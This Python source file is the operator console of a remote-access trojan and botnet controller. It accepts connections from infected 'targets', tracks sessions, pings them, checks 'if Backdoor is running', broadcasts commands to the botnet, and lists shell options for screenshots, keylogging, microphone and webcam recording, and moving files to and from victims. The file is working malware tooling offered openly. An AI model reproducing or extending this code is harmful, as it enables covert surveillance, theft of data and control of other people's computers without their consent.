import os.path
import ntpath
from colorama import init
from termcolor import colored
import subprocess
import threading
from datetime import datetime
import random
import socket
import time
from PIL import ImageGrab, Image

init()


def sendall(command):
    global targets
    try:
        for t in targets:
            t.send(command.encode())
            botnet = t.recv(16184).decode()
            if not botnet:
                raise socket.error
            print(botnet)

    except socket.error as e:
        print(f"[{colored('-', 'red')}]{colored(e, 'red')}")
        for t in targets:
            for k, v in connections.items():
                if k in targets:
                    t.shutdown(socket.SHUT_RDWR)
                    targets.remove(t)
                    ips.remove(v[0])
                    print(f"[{colored('*', 'blue')}]{colored(v[0], 'yellow')} "
                          f"has been removed from target list.")


def pulse_check():
    global ips

    print(f"[{colored('*', 'cyan')}]Running pulse check (type '{colored('ps', 'white')}' to pause)...")
    while not stop_pulse.is_set():
        if stop_pulse.is_set():
            break

        if len(targets) == 0:
            print(f"[{colored('*', 'yellow')}]No connected targets.")
            print(f"[{colored('*', 'blue')}]Stopping pulse check.")
            stop_pulse.set()
            break

        i = 0
        while i < len(ips):
            if i > len(ips):
                i = 0
                continue

            time.sleep(random.randint(2, 3))
            response = subprocess.call(["ping", "-n", "1", ips[i]],
                                       shell=True,
                                       stdout=subprocess.PIPE)
            if response == 0:
                if stop_pulse.is_set():
                    break

                print(f"\n[{colored('*', 'green')}]{colored(ips[i], 'green')}")
                if ips[i] in noping_ips:
                    print(f"[{colored('*', 'green')}]{ips[i]} has been removed from no-ping list.")
                    noping_ips.remove(ips[i])
                    noping_targets.remove(targets[i])
                i += 1

            else:
                if stop_pulse.is_set():
                    break

                print(f"[{colored('*', 'red')}]{colored(ips[i], 'red')}")
                if ips[i] not in noping_ips:
                    noping_targets.append(targets[i])
                    noping_ips.append(ips[i])
                    print(f"[{colored('*', 'blue')}]{colored(ips[i], 'yellow')} "
                          f"has been added to the no-ping list.")


def poke():
    global targets
    global ips

    i = 0
    callbacks = ['yes']
    print(f"[{colored('*', 'blue')}]Poking targets...")
    while not stop_poke.is_set():
        if stop_poke.is_set():
            break

        while i < len(ips):
            if i > len(ips):
                i = 0
                continue

            if len(targets) == 0:
                print(f"[{colored('*', 'yellow')}]No connected targets.")
                print(f"[{colored('*', 'blue')}]Stopping pulse check.")
                break

            try:
                for t in targets:
                    t.send('alive'.encode())
                    ans = t.recv(1024).decode()
                    if ans in callbacks:
                        print(f"\n[{colored('*', 'blue')}]{colored(ips[i], 'yellow')}: "
                              f"{colored('Alive', 'green')}")
                        i += 1

            except socket.error as e:
                print(f"[{colored('*', 'red')}]{colored(ips[i], 'yellow')} does not respond.")
                if t in noping_targets:
                    print(f"\n[{colored('*', 'blue')}]{colored(ips[i], 'yellow')} "
                          f"has been removed from no-ping list.")
                    noping_targets.remove(t)
                    noping_ips.remove(ips[i])

                if t in targets:
                    print(f"\n[{colored('*', 'blue')}]{colored(ips[i], 'yellow')} "
                          f"has been removed from target list.")
                    targets.remove(t)
                    ips.remove(ips[i])

                i += 1
                continue


def listener():
    while True:
        msg = target.recv(16184)
        if str(msg) == 'close':
            break

        print(f"@{ip}: {msg}")


def shell(target, ip):
    while True:
        print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('SHELL CONTROL', 'red')} <=",
              f"{colored('=', 'blue')}" * 20)

        cmd = input(f"@{ip}: ")
        if str(cmd).lower() == "menu":
            print(f"\t\t[{colored('*', 'cyan')}]q               \t----> "
                  f"Go Back to Control Center.")
            print(f"\t\t[{colored('*', 'cyan')}]screenshot      \t----> "
                  f"Capture screenshot.")
            print(f"\t\t[{colored('*', 'cyan')}]skl             \t----> "
                  f"Start Keylogger.")
            print(f"\t\t[{colored('*', 'cyan')}]stkl            \t----> "
                  f"Stop Keylogger.")
            print(f"\t\t[{colored('*', 'cyan')}]smic            \t----> "
                  f"Start Microphone recording.")
            print(f"\t\t[{colored('*', 'cyan')}]stmic           \t----> "
                  f"Stop Microphone recording.")
            print(f"\t\t[{colored('*', 'cyan')}]swebcam         \t----> "
                  f"Start Webcam recoding.")
            print(f"\t\t[{colored('*', 'cyan')}]stwebcam        \t----> "
                  f"Stop Webcam recording.")
            print(f"\t\t[{colored('*', 'cyan')}]download <file> \t----> "
                  f"Download from target.")
            print(f"\t\t[{colored('*', 'cyan')}]upload <file>   \t----> "
                  f"Download file from target.")
            print(f"\t\t[{colored('*', 'cyan')}]get             \t----> "
                  f"Download file from url to the target.")

        if str(cmd).lower() == "q":
            break

        if str(cmd).lower() == 'anydesk':
            target.send(cmd.encode())
            continue

        if str(cmd).lower() == "exit":
            target.send(cmd.encode())
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break

        if str(cmd).lower() == 'screen':
            target.send(cmd.encode())
            fileRecv = target.recv(1024)
            print(f"File name: {str(fileRecv)}")
            filename = open(fileRecv, 'wb')
            while True:
                data = target.recv(1024)
                filename.write(data)

                if not data:
                    break

            filename.close()
            name = ntpath.basename(f"{filename}")
            print(f"{name} Received! :-)")

            target.close()
            continue

        if str(cmd).lower() == 'cmd':
            target.send(cmd.encode())
            continue


def make_sockets(port):
    listener = socket.socket()
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(('192.168.1.10', port))
    listener.listen(5)
    listeners.append(listener)

    return listener


def server(port):
    global clients
    while True:
        if stop_threads:
            break

        while True:
            channel, details = make_sockets(port).accept()
            welcome = "[+][*][*][*][+] Connection Established! [+][*][*][*][+]"
            now = datetime.now()
            channel.send(welcome.encode())
            if channel not in targets:
                targets.append(channel)
                ips.append(details[0])
                connections[channel] = details

            sconnections[channel, details] = now.replace(microsecond=0)
            clients += 1
            print(f"\n[{colored('*', 'cyan')}]Connection from: IP: {colored(details[0], 'green')} | "
                  f"Port: {colored(details[1], 'green')} | Session: {colored(ips.index(details[0]), 'green')}")


if __name__ == '__main__':
    d = datetime.now()
    dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
    noping_live_connections = {}
    connections = {}
    sconnections = {}
    noping_targets = []
    noping_ips = []
    ips = []
    targets = []
    clients = 0
    listeners = []
    ports = [55400]
    stop_threads = False
    stop_pulse = threading.Event()
    stop_pulse.set()
    stop_poke = threading.Event()
    stop_poke.set()
    rndPort = random.choice(ports)
    print(f"[{colored('*', 'cyan')}]Listening on port {rndPort}...")
    server_thread = threading.Thread(target=server,
                                     args=(rndPort,),
                                     name='Server Thread')
    server_thread.start()

    while True:
        command = input("*CONTROL*->>$ ")
        if command == "help":
            print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('Command Center', 'red')} <=",
                  f"{colored('=', 'blue')}" * 20)
            print(f"\t\t[{colored('*', 'cyan')}]pulse                ----> "
                  f"Check ping to connected machines.")
            print(f"\t\t[{colored('*', 'cyan')}]ps                   ----> "
                  f"Pause Pulse Check.")
            print(f"\t\t[{colored('*', 'cyan')}]np                   ----> "
                  f"Show targets with dead pulse check.")
            print(f"\t\t[{colored('*', 'cyan')}]poke                 ----> "
                  f"Check if Backdoor is running.")
            print(f"\t\t[{colored('*', 'cyan')}]targets              ----> "
                  f"Show connected machines.")
            print(f"\t\t[{colored('*', 'cyan')}]session #            ----> "
                  f"Connect to session number.")
            print(f"\t\t[{colored('*', 'cyan')}]rsession #           ----> "
                  f"Remove session from target list.")
            print(f"\t\t[{colored('*', 'cyan')}]asession #           ----> "
                  f"Add session to targets list.")
            print(f"\t\t[{colored('*', 'cyan')}]connhist             ----> "
                  f"Show connections history.")
            print(f"\t\t[{colored('*', 'cyan')}]botnet + command     ----> "
                  f"Send a command to botnet.\n")

        elif command == "pulse":
            stop_pulse.clear()
            check_pulse_thread = threading.Thread(target=pulse_check,
                                                  name='Ping thread')
            check_pulse_thread.start()

        elif command == "ps":
            stop_pulse.set()
            print(f"[{colored('*', 'blue')}]Pulse check paused.")

        elif command == "np":
            if len(noping_ips) == 0:
                print(f"[{colored('*', 'magenta')}]Target list is empty. run 'pulse' command to re-check.")

            count = 0
            for i in noping_ips:
                print(f"[{colored(str(count), 'blue')}]: "
                      f"{colored(i, 'red')}")
                count += 1
            continue

        elif command == "poke":
            stop_poke.clear()
            poke_thread = threading.Thread(target=poke, name='Poke Thread')
            poke_thread.start()

        elif command == "targets":
            if len(ips) == 0:
                print(colored("[i]No connected targets.", 'magenta'))

            count = 0
            for ip in ips:
                print(f"Session [{str(colored(str(count), 'cyan'))}]: {str(colored(ip, 'green'))}")
                count += 1

        elif command[:8] == "session ":
            try:
                num = int(command[8:])
                tarnum = targets[num]
                ipnum = ips[num]
                shell(tarnum, ipnum)
                continue

            except Exception:
                print(f"[!]No session {num}.")

        elif command[:9] == "rsession ":
            num = int(command[9:])
            tarnum = targets[num]
            ipnum = ips[num]
            targets.remove(tarnum)
            ips.remove(ipnum)
            print(f"[{colored('+', 'cyan')}]{colored(ipnum, 'yellow')} removed.")
            continue

        elif command[:9] == "asession ":
            num = int(command[9:])
            tarnum = noping_targets[num]
            ipnum = noping_ips[num]
            targets.append(tarnum)
            ips.append(ipnum)
            continue

        elif command == "connhist":
            c = 1
            for k, v in sconnections.items():
                print(f"[{colored(str(c), 'blue')}]{colored(str(k[1]), 'yellow')} | Time: {colored(v, 'blue')}")

                c += 1

        elif command[:7] == "botnet ":
            sendall(command=command)

        elif command == "exit":
            for t in targets:
                stop_threads = True
                t.shutdown(2)
                t.close()

        else:
            continue
